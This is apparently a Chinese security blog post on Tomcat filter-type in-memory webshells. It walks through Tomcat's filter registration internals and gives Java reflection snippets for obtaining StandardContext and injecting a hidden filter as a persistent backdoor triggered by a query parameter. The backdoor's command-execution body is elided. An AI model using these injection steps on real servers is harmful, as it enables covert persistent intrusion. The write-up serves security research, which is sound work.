# Tomcat内存Webshell解析之Filter型


<meta name="referrer" content="no-referrer" />

## 前言

最近学习了一下基于Tomcat的内存Webshell

https://scriptboy.cn/p/tomcat-filter-inject/

https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA

https://xz.aliyun.com/t/7388

## Filter生效流程

首先我们看下正常的一个filter的注册流程是什么。

首先写一个filter，实现Filter接口。

```
package com.yzddmr6;
import javax.servlet.*;
import java.io.IOException;
public class filterDemo implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter初始化创建....");
    }
    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        System.out.println("进行过滤操作......");
        // 放行
        chain.doFilter(request, response);
    }
    @Override
    public void destroy() {
    }
}
```

在web.xml中添加filter的配置

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900421858-0e6aa29a-30e3-4ad9-8e99-17dfe6bda740.png)

然后调试看一下堆栈信息，找到filterChain生效的过程

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900421949-9ec1e043-069b-4954-9053-3179fe629b4b.png)

然后看看这个filterChain是怎么来的

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422068-511227be-02ff-472c-a83a-8faa186586d1.png)

查看org.apache.catalina.core.ApplicationFilterFactory#createFilterChain源代码

```
...
            filterChain.setServlet(servlet);
            filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
            StandardContext context = (StandardContext)wrapper.getParent();
            FilterMap[] filterMaps = context.findFilterMaps();
            if (filterMaps != null && filterMaps.length != 0) {
                DispatcherType dispatcher = (DispatcherType)request.getAttribute("org.apache.catalina.core.DISPATCHER_TYPE");
                String requestPath = null;
                Object attribute = request.getAttribute("org.apache.catalina.core.DISPATCHER_REQUEST_PATH");
                if (attribute != null) {
                    requestPath = attribute.toString();
                }
                String servletName = wrapper.getName();
                int i;
                ApplicationFilterConfig filterConfig;
                for(i = 0; i < filterMaps.length; ++i) {
                    if (matchDispatcher(filterMaps[i], dispatcher) && matchFiltersURL(filterMaps[i], requestPath)) {
                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());
                        if (filterConfig != null) {
                            filterChain.addFilter(filterConfig);
                        }
                    }
                }
                for(i = 0; i < filterMaps.length; ++i) {
                    if (matchDispatcher(filterMaps[i], dispatcher) && matchFiltersServlet(filterMaps[i], servletName)) {
                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName());
                        if (filterConfig != null) {
                            filterChain.addFilter(filterConfig);
                        }
                    }
                }
                return filterChain;
            } else {
                return filterChain;
            }
        }
...
```

到这里就要掰扯一下这三个的关系：`filterConfig`、`filterMaps`跟`filterDefs`

### filterConfig、filterMaps、filterDefs

直接查看此时StandardContext的内容，我们会有一个更直观的了解

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422164-cfa42ce0-780b-422f-a92c-bcdaaacef9c3.png)

其中filterDefs存放了filter的定义，比如名称跟对应的类，对应web.xml中如下的内容

```
<filter>
        <filter-name>filterDemo</filter-name>
        <filter-class>com.yzddmr6.filterDemo</filter-class>
    </filter>
```

filterConfigs除了存放了filterDef还保存了当时的Context，从下面两幅图可以看到两个context是同一个东西

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422268-205f4f23-e553-41fd-8386-76505b631383.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422350-90f4db7a-4168-4a37-af18-21c3ff6ca790.png)

FilterMaps则对应了web.xml中配置的``，里面代表了各个filter之间的调用顺序。![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422436-10e731cf-3c99-4ecf-adc1-dfd1c7c624f7.png)

即对应web.xml中的如下内容

```
<filter-mapping>
        <filter-name>filterDemo</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
```

都添加完之后， 调用`doFilter` ，进入过滤阶段。

附上宽字节安全的一张图，可以清楚的看到整个流程。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422573-4047e632-393f-44ae-93c8-e8ec1bb3f5d2.png)

到这里，整个流程就已经很清楚了。我们只需要把恶意的filter通过反射动态注入到StandardContext下的filterDefs跟filterConfigs中，每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以让我们的内存马就可以一直驻留下去，直到Tomcat重启。

## 什么是StandardContext

从上面的流程我们可以看到很多操作都跟StandardContext这个东西有关，事实上不管添加Filter还是Servlet都离不开它，那么到底什么是StandardContext呢？

在一个tomcat服务器的生命周期内可以会创建一个或多个StandardContext对象，StandardContext对象代表的是一个具体的工程项目，对应的可以是server.xml里的``标签或webapps文件夹下的某一个工程文件夹或war包，也可以对应于conf/Catalina/localhost文件夹下的任一个xml文件里的Context配置。

附上l1nk3r师傅的一张简洁明了的图

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422693-41c45e7b-3646-42a6-ae94-c2861fb4ea7c.png)

Tomcat中的对应的ServletContext实现是ApplicationContext。ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。

ServletContext主要是适配Servlet规范，StandardContext是tomcat的一种容器。当然两者存在相互对应的关系，通过StandardContext的getServletContext可以获取ServletContext的具体实现。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422788-b3513e71-0ed5-467c-ba60-0c308cd61a95.png)

## 如何获取StandardContext

### 由ServletContext转StandardContext

如果可以获取到request对象的话可以用这种方法

```
ServletContext servletContext = request.getServletContext();
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
    Field applicationContextField = ApplicationContextFacade.class.getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);
    Field standardContextField = ApplicationContext.class.getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
```

### 从线程中获取StandardContext

如果没有request对象的话可以从当前线程中获取

https://zhuanlan.zhihu.com/p/114625962

```
org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) 
    Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
```

### 从Mbean中获取

https://scriptboy.cn/p/tomcat-filter-inject/

```
MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
        // 获取mbsInterceptor
        Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
        field.setAccessible(true);
        Object mbsInterceptor = field.get(mBeanServer);
        // 获取repository
        field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
        field.setAccessible(true);
        Object repository = field.get(mbsInterceptor);
        // 获取domainTb
        field = Class.forName("com.sun.jmx.mbeanserver.Repository").getDeclaredField("domainTb");
        field.setAccessible(true);
        HashMap<String, Map<String, NamedObject>> domainTb = (HashMap<String,Map<String,NamedObject>>)field.get(repository);
        // 获取domain
        NamedObject nonLoginAuthenticator = domainTb.get("Catalina").get("context=/,host=localhost,name=NonLoginAuthenticator,type=Valve");
        field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
        field.setAccessible(true);
        Object object = field.get(nonLoginAuthenticator);
        // 获取resource
        field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
        field.setAccessible(true);
        Object resource = field.get(object);
        // 获取context
        field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
        field.setAccessible(true);
        StandardContext standardContext = (StandardContext) field.get(resource);
```

## 注入filter

filter 的实现，需要分别实现三个接口 init 、doFilter 、destroy

```
Filter filter = new Filter() {
       @Override
       public void init(FilterConfig arg0) throws ServletException {
       }
       @Override
       public void doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)
               throws IOException, ServletException {
   								xxxx
           }
           arg2.doFilter(arg0, arg1);
       }
       @Override
       public void destroy() {
       }
   };
```

那么如何添加一个filter呢，我们可以看下ApplicationContext中addFilter这个方法。

org.apache.catalina.core.ApplicationContext#addFilter(java.lang.String, java.lang.String, javax.servlet.Filter)

```
private Dynamic addFilter(String filterName, String filterClass, Filter filter) throws IllegalStateException {
        if (filterName != null && !filterName.equals("")) {
            if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) {
                throw new IllegalStateException(sm.getString("applicationContext.addFilter.ise", new Object[]{this.getContextPath()}));
            } else {
                FilterDef filterDef = this.context.findFilterDef(filterName);
                if (filterDef == null) {
                    filterDef = new FilterDef();
                    filterDef.setFilterName(filterName);
                    this.context.addFilterDef(filterDef);
                } else if (filterDef.getFilterName() != null && filterDef.getFilterClass() != null) {
                    return null;
                }
                if (filter == null) {
                    filterDef.setFilterClass(filterClass);
                } else {
                    filterDef.setFilterClass(filter.getClass().getName());
                    filterDef.setFilter(filter);
                }
                return new ApplicationFilterRegistration(filterDef, this.context);
            }
        } else {
            throw new IllegalArgumentException(sm.getString("applicationContext.invalidFilterName", new Object[]{filterName}));
        }
    }
```

可以看到首先在判断tomcat的生命周期处于`LifecycleState.STARTING_PREP`状态后，会判断是否存在当前的filter，如果不存在则new一个FilterDef，设置filtername后调用addFilterDef进行添加。

这里就有不同的操作了，如果想要直接使用addFilter这个方法，就需要先用反射修改tomcat的生命周期，调用之后再把state改回去。threedr3am师傅在文章[基于tomcat的内存 Webshell 无文件攻击技术](https://xz.aliyun.com/t/7388)采用的这种方法。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422880-a49d8456-73b0-4e9a-9367-4b6cbee977dd.png)

当然，我们在查看源码之后我们知道，addFilter的主要目的是为了addFilterDef，所以也可以直接通过反射自行添加FilterDef。l1nk3r师傅在[基于Tomcat无文件Webshell研究](基于Tomcat无文件Webshell研究)里采用的是这种实现方式。

```
Filter filter = new filter(){恶意代码}
FilterDef filterDef = new FilterDef();
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
filterDef.setFilter(filter);
standardContext.addFilterDef(filterDef);
```

接下来是如何添加到filterMaps中去。

这里就又有不同的解决办法了：threedr3am师傅是利用filterRegistration.addMappingForUrlPatterns函数，我们来看下这个函数的内容。org.apache.catalina.core.ApplicationFilterRegistration#addMappingForUrlPatterns

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900422970-3f7a81be-c7bf-4621-b33a-3251939ecc14.png)

这个函数会先为filterDef来new一个filterMap，然后在this.context.addFilterMap(filterMap)这一句中就把filterMap给添加到filterMaps中去了。而l1nk3r师傅则直接用反射实现了相应的功能。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900423078-36f66c5f-f8b3-419c-834c-04171ee0eb64.png)

在这里还有一个关键的函数org.apache.catalina.core.StandardContext#addFilterMapBefore，

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900423183-4715ea6a-8d92-44c3-b5d6-032625873790.png)

看一下this.filterMaps.addBefore(filterMap);这一句干了什么

```
public void addBefore(FilterMap filterMap) {
            synchronized(this.lock) {
                FilterMap[] results = new FilterMap[this.array.length + 1];
                System.arraycopy(this.array, 0, results, 0, this.insertPoint);
                System.arraycopy(this.array, this.insertPoint, results, this.insertPoint + 1, this.array.length - this.insertPoint);
                results[this.insertPoint] = filterMap;
                this.array = results;
                ++this.insertPoint;
            }
        }
```

也就是把新增的filterMap给放到数组里的第一个。

因为filter的生效是有优先级的，所以在有其他filter干扰的情况下，把我们的恶意filter放到filterMap的第一位可以提高我们的优先级。在这里threedr3am师傅是自己手动实现了一个增加到第一位的方法。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900423274-cb9b952c-d238-4783-9aa3-ea253b5f3b83.png)

而实际上通过调用addFilterMapBefore就可以达到我们的目的。

接下来就是如何将 filter 添加到 filterConfigs 当中，通过构造函数实例化的时候把filterConfig传进去即可。

```
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
FilterConfig filterConfig = (FilterConfig) constructor.newInstance(standardContext, filterDef);
filterConfigs.put(name, filterConfig);
```

l1nk3r师傅的文章中还提到tomcat 7 与 tomcat 8 在 FilterDef 和 FilterMap 这两个类所属的包名不太一样。

```
tomcat 7:
org.apache.catalina.deploy.FilterDef;
org.apache.catalina.deploy.FilterMap;
tomcat 8:
org.apache.tomcat.util.descriptor.web.FilterDef;
org.apache.tomcat.util.descriptor.web.FilterMap;
```

## 最终效果

首先访问一次内存webshell，触发注入filter。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900423371-709178de-2b69-40eb-b56c-b8b815424068.png)

然后在任意路径下加上`?mr6=xxx`即可触发后门，执行命令

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900423478-a84c3c71-beec-4cc7-bbc1-5a88f81aedc0.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900423670-7e7b576f-af70-4d50-bc9c-47918d8f6440.png)
